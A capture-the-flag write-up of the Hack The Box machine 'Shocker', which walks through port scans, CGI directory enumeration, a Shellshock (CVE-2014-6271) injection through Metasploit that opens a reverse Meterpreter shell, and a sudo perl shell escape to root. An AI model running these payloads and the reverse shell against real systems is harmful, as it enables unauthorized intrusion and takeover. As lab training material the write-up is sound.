<div align="center">

# 🟥 Hack The Box — Shocker

![HTB Badge](https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-00C853?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Status](https://img.shields.io/badge/Status-Pwned%20%E2%98%A0-red?style=for-the-badge)

**Author:** samurai &nbsp;|&nbsp; **Date:** April 18, 2026 &nbsp;|&nbsp; **CVE:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271) (Shellshock)

</div>

---

## 📋 Machine Info

| Field        | Details                                              |
|:-------------|:-----------------------------------------------------|
| 🌐 Platform  | [Hack The Box](https://app.hackthebox.com/machines/Shocker) |
| 💀 Difficulty | Easy                                                 |
| 🐧 OS        | Linux                                                |
| ✍️ Author    | samurai                                              |
| 📅 Date      | April 18, 2026                                       |
| 🔑 User Flag | ✅ Obtained                                          |
| 👑 Root Flag | ✅ Obtained                                          |

---

## 🗺️ Attack Path Summary

```
Reconnaissance  ──►  Web Enumeration  ──►  Shellshock (CVE-2014-6271)  ──►  Sudo Perl GTFOBins  ──►  ROOT
```

---

## 🔍 Reconnaissance

Port scanning was performed using **RustScan** for rapid discovery, followed by an aggressive **Nmap** scan for service and version fingerprinting.

### Nmap

```bash
nmap -A 10.129.22.131
```

<details>
<summary>📄 Click to expand Nmap output</summary>

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-18 21:55 +0400
Nmap scan report for 10.129.22.131
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)

OS details: Linux 3.10 - 4.11
Network Distance: 2 hops
```

</details>

### RustScan

```bash
rustscan -a 10.129.22.131 --ulimit 5000
```

<details>
<summary>📄 Click to expand RustScan output</summary>

```
Open 10.129.22.131:80
Open 10.129.22.131:2222

PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63
```

</details>

### 📌 Open Ports

| Port | Service | Version |
|:----:|:--------|:--------|
| 80   | HTTP    | Apache httpd 2.4.18 (Ubuntu) |
| 2222 | SSH     | OpenSSH 7.2p2 Ubuntu |

> **Note:** Port 2222 is a non-standard SSH port — likely intentional to slow down default scanners. Initial access vector is presumed to be web-based.

---

## 🌐 Web Enumeration

### Step 1 — Root Directory Fuzzing (ffuf)

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
     -u http://10.129.22.131/FUZZ \
     -e .txt,.html,.php
```

<details>
<summary>📄 Click to expand ffuf output</summary>

```
.htpasswd               [Status: 403, Size: 297]
.htaccess               [Status: 403, Size: 297]
cgi-bin/                [Status: 403, Size: 296]
index.html              [Status: 200, Size: 137]
server-status           [Status: 403, Size: 301]
```

</details>

**Key Finding:** The `/cgi-bin/` directory is present (403 Forbidden — exists but access-controlled).

> **💡 What is `/cgi-bin/`?**
> The CGI-BIN directory hosts server-side scripts (`.sh`, `.pl`, `.cgi`) executed by the web server. Scripts here often run with elevated permissions, making them high-value targets. The presence of this directory combined with Apache on Ubuntu immediately suggests **Shellshock** may be possible.

---

### Step 2 — CGI-BIN Deep Enumeration (Gobuster)

Since the root scan didn't reveal exploitable paths, we enumerate directly inside `/cgi-bin/` looking for executable scripts:

```bash
gobuster dir \
  -u http://10.129.22.131/cgi-bin/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -x sh,pl,cgi \
  --xl 4547
```

<details>
<summary>📄 Click to expand Gobuster output</summary>

```
/.hta                 (Status: 403)
/.htaccess            (Status: 403)
/.htpasswd            (Status: 403)
/user.sh              (Status: 200) [Size: 119]   ← !!
```

</details>

**🎯 Discovery:** `/cgi-bin/user.sh` — a non-default, accessible bash script returning HTTP 200.

Visiting `http://10.129.22.131/cgi-bin/user.sh` in a browser returns output identical to the `uptime` command — confirming that **bash is being invoked server-side**. This is a classic indicator of **Shellshock** vulnerability.

---

## 💥 Initial Access — Shellshock (CVE-2014-6271)

### Vulnerability

**Shellshock** (CVE-2014-6271) is a critical vulnerability in GNU Bash that allows attackers to inject arbitrary commands via maliciously crafted environment variables (e.g., the `User-Agent` HTTP header). When Apache mod_cgi passes these headers to Bash as environment variables, the injected commands execute on the server.

```
User-Agent: () { :;}; <INJECTED_COMMAND>
```

### Exploitation via Metasploit

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec

set RHOSTS    10.129.22.131
set TARGETURI /cgi-bin/user.sh
set LHOST     tun0
set LPORT     9001
set CVE       CVE-2014-6271

run
```

<details>
<summary>📄 Click to expand Metasploit session output</summary>

```
[*] Started reverse TCP handler on 10.10.15.33:9001
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1062760 bytes) to 10.129.22.131
[*] Meterpreter session 1 opened (10.10.15.33:9001 -> 10.129.22.131:59496)

meterpreter >
```

</details>

✅ **Meterpreter shell obtained as user `shelly`.**

---

## 👑 Privilege Escalation — Sudo + Perl (GTFOBins)

### Enumeration

After landing a shell, the first step is checking sudo permissions:

```bash
sudo -l
```

```
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

> **🔑 Key Finding:** User `shelly` can run `/usr/bin/perl` as **root with no password required**.

### Exploitation

Referencing [GTFOBins — Perl (Sudo)](https://gtfobins.github.io/gtfobins/perl/#sudo), `perl` can spawn an interactive shell when executed with sudo:

```bash
sudo -u root /usr/bin/perl -e 'exec "/bin/sh"'
```

```
# whoami
root
```

✅ **Root shell obtained.**

---

## 🏁 Flags

| Flag | Path | Status |
|:-----|:-----|:------:|
| 🧑 User Flag | `/home/shelly/user.txt` | ✅ |
| 👑 Root Flag | `/root/root.txt` | ✅ |

---

## 🧠 Key Takeaways

| # | Lesson |
|:--|:-------|
| 1 | Always enumerate `/cgi-bin/` with script-specific extensions (`.sh`, `.pl`, `.cgi`) |
| 2 | Bash CGI scripts on Apache are a strong Shellshock indicator |
| 3 | `sudo -l` is the first thing to run after getting a shell |
| 4 | Unrestricted `sudo` on interpreters like `perl`, `python`, `ruby` = instant root via GTFOBins |

---

## 🛠️ Tools Used

| Tool | Purpose |
|:-----|:--------|
| [Nmap](https://nmap.org/) | Port scanning & service fingerprinting |
| [RustScan](https://github.com/RustScan/RustScan) | Fast port discovery |
| [ffuf](https://github.com/ffuf/ffuf) | Web directory fuzzing |
| [Gobuster](https://github.com/OJ/gobuster) | CGI-BIN enumeration |
| [Metasploit](https://www.metasploit.com/) | Shellshock exploitation |
| [GTFOBins](https://gtfobins.github.io/) | Sudo privilege escalation reference |

---

## 📚 References

- [CVE-2014-6271 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
- [GTFOBins — Perl](https://gtfobins.github.io/gtfobins/perl/)
- [Hack The Box — Shocker](https://app.hackthebox.com/machines/Shocker)

---

<div align="center">

*Write-up by **samurai** · April 18, 2026*

</div>
